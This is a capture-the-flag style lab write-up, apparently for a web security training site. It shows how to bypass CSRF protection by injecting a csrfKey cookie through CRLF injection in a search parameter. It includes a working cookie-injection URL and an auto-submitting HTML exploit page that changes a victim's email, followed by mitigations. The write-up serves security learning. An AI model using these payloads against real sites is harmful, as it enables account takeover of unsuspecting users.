# Lab Name
CSRF where token is tied to non-session cookie

## Vulnerability
Cross-Site Request Forgery (CSRF) – Token Tied to Non-Session Cookie

## Objective
Exploit the CSRF protection by injecting an attacker-controlled csrfKey cookie and use it to change the victim's email address.

## Entry Point
Change Email functionality and Search functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF) / Cookie Injection

## Methodology
1. Open Burp's browser and log in using the provided user credentials.

2. Navigate to the **My Account** page and submit the **Update email** form.

3. Intercept the request using **Burp Suite Proxy** and send it to **Burp Repeater**.

4. Observe that changing the **session** cookie logs you out, while changing only the **csrfKey** cookie causes the CSRF token validation to fail. This indicates that the **csrfKey** cookie is not tied to the user session.

5. Open an **Incognito** browser window and log in using the second account.

6. Submit another **Update email** request and send it to **Burp Repeater**.

7. Replace the **csrfKey** cookie and **csrf** parameter with the values copied from the first account.

8. Observe that the request is accepted, confirming that the CSRF token is validated only against the **csrfKey** cookie and not the authenticated session.

9. Close the Incognito browser.

10. Back in the original browser, perform any search request and intercept it.

11. Observe that the search parameter is reflected inside the **Set-Cookie** response header, allowing cookie injection via CRLF injection.

12. Create the following URL using your own **csrfKey** value:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None
```

13. Generate a **CSRF PoC** from the email change request using Burp Suite.

14. Upload the exploit to the **Exploit Server**.

15. Remove the auto-submit script and add the following image tag before the form submission to inject the attacker's **csrfKey** cookie:

```html
<img src="https://0afc00dd03b3c6f280800dc900920009.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

16. Modify the email address in the exploit to an attacker-controlled email address.

17. Store the exploit and click **Deliver to victim**.

18. When the victim visits the exploit page, the malicious image injects the attacker's **csrfKey** cookie into the victim's browser. The form is then automatically submitted with the matching CSRF token, causing the email address to be changed successfully and solving the lab.

## Payload Used

### Cookie Injection URL

```text
/?search=test%0d%0aSet-Cookie:%20csrfKey=CSRF_KEY%3b%20SameSite=None
```

### Exploit

```html
<html>
  <body>

    <img src="https://YOUR-0afc00dd03b3c6f280800dc900920009.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None"
         onerror="document.forms[0].submit()">

    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="xyz@example.com">
      <input type="hidden" name="csrf" value="CSRF_TOKEN">
    </form>

  </body>
</html>
```

## Result
Successfully injected an attacker-controlled **csrfKey** cookie into the victim's browser and bypassed the CSRF protection, allowing an unauthorized email change.

## Impact
- Unauthorized account modifications
- CSRF protection bypass
- User impersonation
- Account takeover opportunities
- Sensitive information modification

## Mitigation
- Bind CSRF tokens to the authenticated user's session.
- Do not validate CSRF tokens using client-controlled cookies.
- Prevent CRLF injection and HTTP response splitting.
- Sanitize user input before reflecting it into HTTP headers.
- Validate Origin and Referer headers in addition to CSRF tokens.

## Learning
CSRF tokens should always be tied to the authenticated user's session. In this lab, the application validated the CSRF token only against a non-session cookie, allowing an attacker to inject a matching **csrfKey** cookie using a CRLF injection vulnerability. By controlling both the cookie and the CSRF token, the attacker successfully bypassed the CSRF protection.
